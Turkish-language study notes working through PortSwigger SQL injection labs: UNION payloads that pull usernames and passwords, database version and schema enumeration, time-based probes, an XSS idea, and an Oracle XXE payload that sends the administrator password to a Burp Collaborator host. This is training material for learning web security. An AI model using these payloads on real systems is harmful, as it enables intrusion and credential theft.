<h1 align="center">PortSwigger SQL Labları ve Çözümleri</h1>

Bu link üzerinden PortSwigger'ın hazırladığı [*SQLi Cheat Sheet*](https://portswigger.net/web-security/sql-injection/cheat-sheet)'e ulaşabilirsiniz.

## Lab: SQL injection UNION attack, retrieving data from other tables
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/4c57a4ac-6b70-44a8-9d4b-c937c5995c6c)
- Buna bakarak: SQL query’sinden dönen datanın ekranda print edilmesi senin için bir zaafiyet durumunda UNION ile daha kolay çözebileceğin anlamına gelir.
- MYSQL ve Postgresql de karşılaşılan tırnak hadisesi.
```
...?category=Accessories'
```
Internel Server Error görmen zaafiyet olması anlamına gelmiyor.
```
...?category=Accessories''
```
- 2 tane tırnak attığında errorun ortadan kalkıyor olması DB e giden syntax erroru çözdün demek oluyor yani SQLi var burda.
	- Accessories' and '1'='1 ile de çözebilirsin.
- 'Accessories' and '1'='1' bunu bu şekilde çözmektense,
- 'Accessories' and 1=1--' buna dönüştürürsen eğer # şekilnde mi --(Postgres için command line işareti) şeklinde mi çalışıyor ondan emin olursun. 
- Bundan emin olduktan sonra UNION ile ilerleyebilirsin.
```sql
Accessories' UNION SELECT null,null--
	UNION kullanmak için kolon sayısı aynı olması gerekiyor o yüzden 2 tane null yetti

mehmetince' UNION SELECT null,null--
	diğer veriler gelmemesi için

UNION SELECT username,password FROM users--
	username ve password kısmı lab girişinde söyleniyor.
```
## Lab: SQL injection UNION attack, retrieving multiple values in a single column
```sql
SELECT a,b,c,d FROM x WHERE y = 'Accessories'
```
- Eğer gelen datanın 2 kolonundan sadece tek bir kolonun datasını yazıyor ise;
```sql
UNION SELECT null,'metmet' FROM users--
```
#### kolonların type ları aynı olması gerekiyor burası çokomelli (Mysql istemez, Postgresql ister)
```sql
UNION SELECT null,CONCAT(username,':::MDISEC:::',password) FROM users--
```
- username ve password kolonlarını birleştiriyor arasına da :::MDISEC::: yazıyor
## Lab: SQL injection attack, querying the database type and version on Oracle
```sql
...accessories' UNION SELECT null,null FROM dual--

...accessories' UNION SELECT null,'mehmet' FROM dual--
	hangi kolonu alıyor onu anlamak için.

...accessories' UNION SELECT null,banner FROM v$version--
	SELECT banner FROM v$version şeklinde çalışıyor
```
- Bu datayı ekrana print ederken encoding yapmıyorsa XSS de olabilir. Gelen datayı değiştir, manipüle et.
```sql
UNION SELECT null,<svg onload=alert(1)> FROM v$version--
```
## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft [*Lab linki*](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
- Mysqlde -- boşluk ve yanına bir şey yazman lazım # yerine
```mysql
?category=MDISEC' UNION SELECT null,@@version#
	# yerine %23
```
## Lab: SQL injection attack, listing the database contents on non-Oracle databases [*Lab Linki*](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
```mysql
...?category=MDISEC' UNION SELECT 1,2 -- aasf
```
- hangi tip DB olduğunu öğrenmek için öncelikle böyle yaptık. 1,2 yazarak data tipleri farklı olan bir tabloymuş gibi istek attık Postgresql aynı istediği için hata verdi
```mysql
?category=MDISEC' UNION SELECT null,null -- aasf
```
- yazınca düzeldi
```mysql
?category=MDISEC' UNION SELECT null,table_name FROM information_schema.tables-- aasf''
?category=MDISEC' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=current_schema()-- aasf
```
- sadece bizim şemaya ait tablo isimlerini getirmek istiyoruz
```mysql
?category=MDISEC' UNION SELECT null,column_name FROM information_schema.cloumns WHERE table_name='users_yhfrcv'--
```
- username ve şifre kolonlarını getirdi bize
```
MDISEC' UNION SELECT null,concat(username_ktovtr, ':::MDISEC:::', password_sgugwv) FROM users_yhfrcv--
```
## Lab: Blind SQL injection with out-of-band data exfiltration
1) category=Lifestyle'
2) category=Lifestyle''
  - Data gelmedi iki şekilde de sıkıntı var aga burda değil demekki


- ürünler üstünde deneyelim
1) productid=9'
	- hata geldi
2) productid=9''
	- yine hata geldi burada da değil o zaman
  - Bu kategorilerde data gelip gittiği için Blind değil, Error görmediğimiz için de error based hiç değil.
1) category=Lifestyle"
2) category=Lifestyle'--
	- olmuyor...
- Burp Suite başvurma zamanı
- Cookie kısmında TrackingId ' yapmayı denedi olmadı. Data eksilip artmadı.
	- TrackingId olsaydı, SQL INSERT sorgusunda sıkıntı olmuş olurdu
	- SessionId kısmına da aynısını yaptı yine olmadı.
  - Hala TrackingId den şüphelenmeye devam ediyor. Time Based payloadlar deniyor.
```sql
' -sleep(5)-'
'||pg_sleep(5)||'
```
- Şöyle bir şey de olabilir : 
  - Senden aldığı isteği direkt cevabını veriyor olabilir, arka tarafta da Background Job başlatır ve senden aldığı parametre ile iş yapar.
  - DB aldığı veriyi Queue'ya yazıyor onu da Worker'a veriyor. Burda Time Based SQLi işe yaramaz. SQLi çalışıyor ama arkadaki iş bekliyor.
- Dışarıyla iletişim kurmayı sağlatmak gerekiyor. Cookieleri noktalı virgüle(;) göre alıyor
  - TrackingId=ljashfuashuıeasjf';SELECT; session=asjfhasfhasoıjasd15811he281uıhur
	- yapsan bile noktalı virgüle(;) göre ayırdığı için cookieleri, bunları arkada nasıl ayıracak belli değil.
#### Lab sayfasında asenkron yazıyormuş :) Bu tür yapıları gerçek hayatta da exploit etmek zor whitebox testlerde rahat çıkartabiliyorsun.
##### Gerçek hayat senaryosunda şöyle bir şey gerçek olmaz : SELECT * FROM x WHERE y = ljashfuashuıeasjf
- INSERT sorgusu görürsün databasede. INSERT INTO X (a,b,c) VALUES ('','','ljashfuashuıeasjf')
- sleepi denemesinin sebebi de INSERT sorgusu varsa sleep eder diye.
```sql
INSERT INTO X (a,b,c) VALUES ('aaaaa'); ,'','ljashfuashuıeasjf')
```
- Bu kısım sıkıntı çıkartmaya başlar ; yüzünden
```sql
INSERT INTO X (a,b,c) VALUES ('','','A'||(SELECT)||'C')
```
- SubSELECT sorgusu atabiliyor muyuz onu kontrol ediyor. ORACLE olduğuna karar verdi
- Burp collaborator açtı en sol üstteki Burp sekmesinden. Asenkron yapı olduğu için başka bir websitesine istek attırtıyorsun zorla.
```sql
INSERT INTO X (a,b,c) VALUES ('','','A'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %25remote;]>'),
'/l') FROM dual)||'C')
```
- Bu şekilde de olur
```sql
INSERT INTO X (a,b,c) VALUES ('','','A'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://askfjgasjıs.BURP-COLLABORATOR-SUBDOMAIN/"'||(SELECT password FROM users WHERE username = 'administrator')||'> %25remote;]>'),
'/l') FROM dual)||'C')
```
- İsteği yolladıktan sonra Poll now tuşuna bas collaborator dan.

## Ekstra Not:
SQLmapte : * koyarak parametre vermiş oluyorsun
x.com/api/user/1*/get
